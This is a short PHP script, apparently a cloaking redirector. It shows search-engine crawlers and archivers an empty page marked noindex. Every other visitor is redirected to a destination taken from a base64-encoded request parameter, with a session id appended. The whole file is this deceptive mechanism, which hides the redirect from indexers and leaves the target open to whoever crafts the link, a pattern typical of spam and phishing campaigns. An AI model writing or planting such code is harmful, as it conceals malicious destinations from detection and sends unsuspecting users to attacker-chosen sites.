<?
function check_search_engine() {
  if (!isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = '';
  } else {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
  }

  $search_engines[] = 'Fast';
  $search_engines[] = 'Slurp';
  $search_engines[] = 'Ink';
  $search_engines[] = 'Atomz';
  $search_engines[] = 'Scooter';
  $search_engines[] = 'Crawler';
  $search_engines[] = 'bot';
  $search_engines[] = 'Genius';
  $search_engines[] = 'AbachoBOT';
  $search_engines[] = 'AESOP_com_SpiderMan';
  $search_engines[] = 'ia_archiver';
  $search_engines[] = 'Googlebot';
  $search_engines[] = 'UltraSeek';
  $search_engines[] = 'Google';

  foreach ($search_engines as $key => $value) {
    if ($user_agent != '') {
      if(strstr($user_agent, $value)) {
        $is_search_engine = 1;
      }
    }
  }

  if (isset($is_search_engine)) {
    return TRUE;
  } else {
    return FALSE;
  }
}

if (check_search_engine() == TRUE) {
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title></title>
<meta name="robots" content="noindex, nofollow">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body>
</body>
</html>
<?
} else {
  $eb = $_REQUEST['eb'];
  $sid = $_REQUEST['sid'];
  if ($eb) {
    $eb = base64_decode($eb);
	if (isset($sid)) {$eb .= "&sid=" . $sid;}
    header("Location: " . $eb);
    exit;
  }
}
?>